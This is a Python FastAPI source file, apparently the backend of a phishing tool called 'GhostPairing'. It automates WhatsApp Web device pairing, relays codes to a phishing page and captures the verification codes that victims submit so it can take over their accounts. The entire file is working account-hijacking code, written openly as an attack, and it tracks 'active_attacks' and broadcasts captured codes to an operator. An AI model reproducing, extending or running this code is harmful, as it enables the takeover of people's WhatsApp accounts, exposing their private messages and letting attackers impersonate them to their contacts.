"""
Attack endpoints — phone verification, code display, pairing checks.
"""
import time
from datetime import datetime

from fastapi import APIRouter, HTTPException, Request
from fastapi.responses import JSONResponse

from core.database import db
from core.websocket_manager import ws_manager
from core.logging_config import get_logger
from models.schemas import (
    PhoneRequest,
    DisplayCodeRequest,
    VerifyCodeRequest,
    AttackInitResponse,
    CodeDisplayResponse,
    PairingStatusResponse,
)
from automation.pairing_flow import whatsapp_api

logger = get_logger(__name__)
router = APIRouter(prefix="/api", tags=["attack"])

# In-memory active attacks (threading-safe via lock in pairing_flow)
active_attacks: dict = {}


@router.post("/request-code", response_model=AttackInitResponse)
async def request_verification_code(request: Request):
    """Start WhatsApp verification via browser automation."""
    try:
        data = await request.json()
        phone_req = PhoneRequest(**data)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

    phone_number = phone_req.phone
    logger.warning(f"GhostPairing attack initiated for {phone_number[:5]}***")

    result = whatsapp_api.request_verification_code(phone_number)

    if result.get("success"):
        attack_id = result["attack_id"]
        active_attacks[attack_id] = {
            "phone": phone_number,
            "started_at": datetime.now().isoformat(),
            "status": "automation_started",
        }

        await ws_manager.broadcast({
            "type": "new_attack",
            "attack_id": attack_id,
            "phone": phone_number,
            "timestamp": datetime.now().isoformat(),
            "message": "New GhostPairing attack with browser automation",
            "automation": True,
        })

        logger.info(f"Browser automation started for attack {attack_id}")
        return JSONResponse(content=result)

    raise HTTPException(
        status_code=500,
        detail=result.get("error", "Automation failed"),
    )


@router.post("/display-code", response_model=AttackInitResponse)
async def display_code_endpoint(request: Request):
    """Receive the displayed code from WhatsApp Web (sent by Playwright)."""
    try:
        data = await request.json()
        req = DisplayCodeRequest(**data)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

    logger.warning(f"Displayed code captured from WhatsApp Web: {req.code}")
    logger.info(f"Sending to phishing page for attack {req.attack_id}")

    if req.attack_id in active_attacks:
        active_attacks[req.attack_id]["displayed_code"] = req.code
        active_attacks[req.attack_id]["code_displayed_at"] = str(int(time.time()))

    return JSONResponse(content={
        "success": True,
        "message": "Code received and stored",
    })


@router.get("/get-displayed-code/{attack_id}", response_model=CodeDisplayResponse)
async def get_displayed_code(attack_id: int):
    """Phishing page polls this to get the WhatsApp Web displayed code."""
    if attack_id in active_attacks and "displayed_code" in active_attacks[attack_id]:
        return JSONResponse(content={
            "success": True,
            "code": active_attacks[attack_id]["displayed_code"],
            "phone": active_attacks[attack_id]["phone"],
        })
    return JSONResponse(content={
        "success": False,
        "message": "Code not yet available",
    })


@router.get("/check-pairing/{attack_id}", response_model=PairingStatusResponse)
async def check_pairing_status(attack_id: int):
    """Check if WhatsApp pairing was completed (polled by phishing page)."""
    # Check database directly (authoritative source)
    paired = db.check_pairing_complete(attack_id)

    if paired and attack_id in active_attacks:
        active_attacks[attack_id]["paired"] = True
        active_attacks[attack_id]["completed"] = True

    if paired:
        return JSONResponse(content={
            "success": True,
            "paired": True,
            "completed": True,
            "status": "paired",
        })

    # Fallback: check in-memory
    if attack_id in active_attacks:
        atk = active_attacks[attack_id]
        return JSONResponse(content={
            "success": True,
            "paired": atk.get("paired", False),
            "completed": atk.get("completed", False),
            "status": "paired" if atk.get("paired") else "waiting",
        })

    return JSONResponse(content={
        "success": False,
        "message": "Attack not found",
    })


@router.post("/mark-paired/{attack_id}", response_model=AttackInitResponse)
async def mark_attack_paired(attack_id: int):
    """Automation signals that pairing is complete."""
    if attack_id in active_attacks:
        active_attacks[attack_id]["paired"] = True
        active_attacks[attack_id]["completed"] = True
        logger.info(f"Attack {attack_id} marked as paired")
        return JSONResponse(content={
            "success": True,
            "message": "Attack marked as paired",
        })

    logger.warning(f"Attempted to mark non-existent attack {attack_id} as paired")
    return JSONResponse(
        content={"success": False, "message": "Attack not found"},
        status_code=404,
    )


@router.post("/verify-code", response_model=AttackInitResponse)
async def verify_code_endpoint(request: Request):
    """Victim submits verification code from their phone."""
    try:
        data = await request.json()
        req = VerifyCodeRequest(**data)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

    logger.warning(f"Verification code captured: attack {req.attack_id}")
    logger.info("Sending code to browser automation...")

    result = whatsapp_api.verify_code(req.attack_id, req.code)

    if result.get("success"):
        if req.attack_id in active_attacks:
            active_attacks[req.attack_id]["code_received"] = req.code
            active_attacks[req.attack_id]["code_time"] = datetime.now().isoformat()

        await ws_manager.broadcast({
            "type": "code_captured",
            "attack_id": req.attack_id,
            "code": req.code,
            "timestamp": datetime.now().isoformat(),
            "message": "Verification code captured — automation will complete pairing",
            "automation": True,
        })

        return JSONResponse(content=result)

    return JSONResponse(content=result, status_code=400)
